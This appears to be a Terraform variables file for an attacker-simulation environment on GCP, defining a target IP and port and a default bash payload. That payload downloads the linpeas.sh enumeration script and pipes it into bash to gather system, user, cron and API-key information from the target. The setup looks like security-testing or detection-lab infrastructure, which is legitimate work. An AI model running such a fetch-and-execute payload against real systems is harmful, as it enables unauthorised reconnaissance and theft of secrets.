variable "environment" {
    type = string
    description = "name of the environment"
}

variable "deployment" {
    type = string
    description = "unique deployment id"
}

variable "gcp_location" {
    type = string
}

variable "gcp_project_id" {
    type    = string
}

variable "tag" {
    type = string
    default = "osconfig_exec_vuln_npm_app_attacker"
}

variable "timeout" {
    type = string
    default = "600s"
}

variable "target_ip" {
  type = string
  description = "target ip"
}

variable "target_port" {
  type = number
  description = "target port"
}

variable "payload" {
  type = string
  description = "bash payload to execute"
  default =   <<-EOT
              curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex
              EOT
}